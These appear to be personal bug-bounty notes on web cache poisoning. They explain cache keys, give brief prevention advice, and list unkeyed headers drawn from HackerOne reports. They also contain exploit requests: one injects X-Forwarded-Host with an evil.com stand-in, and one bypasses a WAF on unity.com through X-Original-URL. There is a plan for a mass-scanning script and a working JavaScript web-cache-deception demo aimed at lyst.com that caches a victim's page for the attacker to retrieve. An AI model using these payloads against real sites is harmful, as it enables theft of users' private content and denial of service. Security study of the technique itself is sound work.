Web Cache Poisoning
A cache poisoning attack uses an HTTP request to trick an origin web server into 
responding with a harmful resource that has the same cache key as a clean request. 
As a result, the poisoned resource gets cached and served to other users.

Cache Keys
A CDN like Cloudflare relies on cache keys to compare new requests against cached resources. 
The CDN then determines whether the resource should be served from the cache or 
requested directly from the origin web server.

However, injecting a payload is not the only possible vector for this vulnerability. 
Other possibilities include :
A denial-of-service attack through headers like “x-forwarded-scheme”: 
Using this header generally returns a 302 error to the current page in https. 
If the response is cached, this causes an infinite loop making the page inaccessible.
Using an illegal header such as “\”, which means that the server will respond to a 400 error page. 
If this page is cached, it will be inaccessible to other users.

The cache key is a selected set of HTTP request elements (parts of the request line and the headers) and their values. 
If all the values in a cache key match those of a previous request, 
the cache assumes it can return the cached response associated with that request, 
without the need to get a new response from the web server. 
Parts of the HTTP request that are included in the cache key are called keyed inputs, 
and the rest are unkeyed inputs. 
Almost all cache keys include at least the path and host, but other header values may also be used. 
Sometimes, only selected parts and parameters of the path are keyed, rather than the entire path


Prevention
Only cache files that are truly static
Review the caching configuration for your origin web server and ensure you are caching 
files that are static and do not depend on user input in any way. 

Which file extensions does Cloudflare cache for static content?
How Do I Tell Cloudflare What to Cache?
Do not trust data in HTTP headers
Client-side vulnerabilities are often exploited through HTTP headers, 
including cross-site scripting (XSS). 
In general, you should not trust the data in HTTP headers and as such:
Do not rely on values in HTTP headers if they are not part of your cache key.
Never return HTTP headers to users in cached content.
Do not trust GET request bodies
Cloudflare caches contents of GET request bodies, but they are not included in the cache key. 
GET request bodies should be considered untrusted and should not modify the contents of a response. 
If a GET body can change the contents of a response, consider bypassing cache or using a POST request.

Cache Poisoning Web Apps with HTTP Headers
> Accept_Encoding: br.  Gareth Used this on IG, When Accept-Encoding is in the Cache Key
> X-Forwarded-Port see https://hackerone.com/reports/409370
> X-Forwarded-Host
> X-Forwarded-Server
> X-Host
> X-Original-URL 
> X-Rewrite-URL
> X-Forwarded-SSL
> Transfer-Encoding albinowax used zTRANSFER-ENCODING on bitbucket.
> Content-Type: <invalid_value>
> x-http-method-override supported by GCP buckets
x-http-method-override: HEAD if cached, returns an empty response
x-http-method-override: PURGE, try if enabled.
Find other targets using GCP buckets and test 
Moral of the story, brute force cache poisoning headers 
> X-Forwarded-Scheme - Rack Middleware
> x-forwarded-scheme: http               results into a 301 redirect to the same location.
If the response is cached by a CDN, it would cause a redirect loop, denying access to the file

Max bounty $3k Exploit
GET /main/static.js HTTP/1.1
> Host: redacted.com
> x-forwarded-scheme: https
> X-Forwarded-Host: <evil.com>

> Authorization:        crafted headers      see https://hackerone.com/reports/1173153
// Write ParamMiner,
Testing Basic Web Cache Poisoning DoS
Write a script that takes a list of domain names,
For each domain name test a couple of requests with
the potential to cause cache poisoning and 
---
save the response headers and the first 10 lines of the body if it exist. 
---
even better, just parse the resp and search for the injected header value
and discard the resp if it is not found, else save the response and mark 
the domain as vulnerable to cache poisoning 
---
For each domain, create a .txt file and 
save its response. 

Get one of those offline LLMs, 

Bypassing WAF <PHP Frameworks>
> GET /admin HTTP/1.1
> Host: unity.com
> HTTP/1.1 403 Forbidden
> ...
> Access is denied

> GET /anything HTTP/1.1
> Host: unity.com
> X-­Original-­URL: /admin
> HTTP/1.1 200 OK
> ...
> Please log in

DEMO Script 
`
<html>
  <head> </head>
  <body>
    <script>
      var cachedUrl = "https://www.lyst.com/" + generateId() + ".css";
      const popup = window.open(cachedUrl);

      function generateId() {
        var content = "";
        const alphaWithNumber = "QWERTZUIOPASDFGHJUKLYXCVBNM1234567890";

        for (var i = 0; i < 10; i++) {
          content += alphaWithNumber.charAt(
            Math.floor(Math.random() * alphaWithNumber.length)
          );
        }
        return content;
      }

      var checker = setInterval(function () {
        if (popup.closed) {
          clearInterval(checker);
        }
      }, 200);
      var closer = setInterval(function () {
        popup.close();
        document.body.innerHTML =
          'Victims content is now cached <a href="' +
          cachedUrl +
          '">here and the url can be saved on the hackers server</a><br><b>Full Url: ' +
          cachedUrl +
          "</b>";
        clearInterval(closer);
      }, 3000);
    </script>
  </body>
</html>
`

Discreet Poisoning : Timing the resource to determin exactly when a cache expires 
to send a req to potential get a new cache
Headers like max-age offers an insight into when the cache expires. 

Selective Poisoning : HTTP Headers such as Vary tells the front-end which 
other headers should be part of the cache key, even though some CDNs like
cloudflare ignores the Vary header, it means a header in the Vary header
may be part of the cache key, if this is the case, it means you can tailor
the cache poisoning to say people using a specific version of any browser
if the User-Agent is keyed. 

The 'CF-Cache-Status' header here is an indicator that Cloudflare is considering caching this response, but in
spite of this the response was never actually cached. I speculated that Cloudflare's refusal to cache this might be
related to the session_id cookie, and retried with that cookie present:

WHich cached did I poison?
target.com/cdn-cgi/trace

On Resp
> Cache-­Control: max­age=0, private, must­revalidate
> HTTP/1.1 200 OK
Bc CF won't cache Cache-­Control: private resp, when you get this,
you can try other pages on the site that is cacheable.